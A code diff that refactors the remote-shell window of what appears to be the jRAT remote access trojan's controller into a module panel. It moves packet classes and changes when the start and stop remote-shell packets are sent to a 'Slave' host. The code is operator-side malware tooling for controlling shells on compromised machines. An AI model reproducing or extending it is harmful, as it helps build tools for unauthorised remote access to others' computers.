@@ -1,39 +1,26 @@
-package jrat.controller.ui.frames;
+package jrat.module.shell.ui;
 
 import com.redpois0n.terminal.InputListener;
 import com.redpois0n.terminal.JTerminal;
+import jrat.api.Resources;
+import jrat.api.ui.ClientPanel;
 import jrat.controller.Slave;
-import jrat.controller.packets.outgoing.Packet22RemoteShellTyped;
-import jrat.controller.packets.outgoing.Packet23RemoteShellStart;
-import jrat.controller.packets.outgoing.Packet24RemoteShellStop;
+import jrat.module.shell.packets.Packet22RemoteShellTyped;
+import jrat.module.shell.packets.Packet23RemoteShellStart;
+import jrat.module.shell.packets.Packet24RemoteShellStop;
 
 import javax.swing.*;
 import java.awt.*;
-import java.awt.event.WindowAdapter;
-import java.awt.event.WindowEvent;
-import java.util.HashMap;
-import java.util.Map;
 
 @SuppressWarnings("serial")
-public class FrameRemoteShell extends BaseFrame {
+public class FrameRemoteShell extends ClientPanel {
 
-	public static final Map<Slave, FrameRemoteShell> INSTANCES = new HashMap<>();
-	
 	private JTerminal terminal;
 
     public FrameRemoteShell(Slave s) {
-		super(s);
-		INSTANCES.put(slave, this);
-		addWindowListener(new WindowAdapter() {
-			@Override
-			public void windowClosing(WindowEvent arg0) {
-				exit();
-			}
-		});
-		setIconImage(Toolkit.getDefaultToolkit().getImage(FrameRemoteShell.class.getResource("/terminal.png")));
-		setTitle("Remote Shell");
-		setDefaultCloseOperation(DISPOSE_ON_CLOSE);
-		setBounds(100, 100, 499, 302);
+		super(s, "Remote Shell", Resources.getIcon("terminal"));
+
+		setLayout(new BorderLayout(0, 0));
 
         JScrollPane scrollPane = new JScrollPane();
 		terminal = new JTerminal();
@@ -56,9 +43,7 @@ public class FrameRemoteShell extends BaseFrame {
 
 		addKeyListener(terminal.getKeyListener());
 		setSize(675, 300);
-		
-		slave.addToSendQueue(new Packet23RemoteShellStart());
-	}
+    }
 	
 	private void send(char c) {
         slave.addToSendQueue(new Packet22RemoteShellTyped(c));
@@ -68,9 +53,12 @@ public class FrameRemoteShell extends BaseFrame {
 		return terminal;
 	}
 
-	public void exit() {
+	public void opened() {
+        slave.addToSendQueue(new Packet23RemoteShellStart());
+    }
+
+	public void dispose() {
+        super.dispose();
 		slave.addToSendQueue(new Packet24RemoteShellStop());
-		slave = null;
-		INSTANCES.remove(slave);
 	}
 }
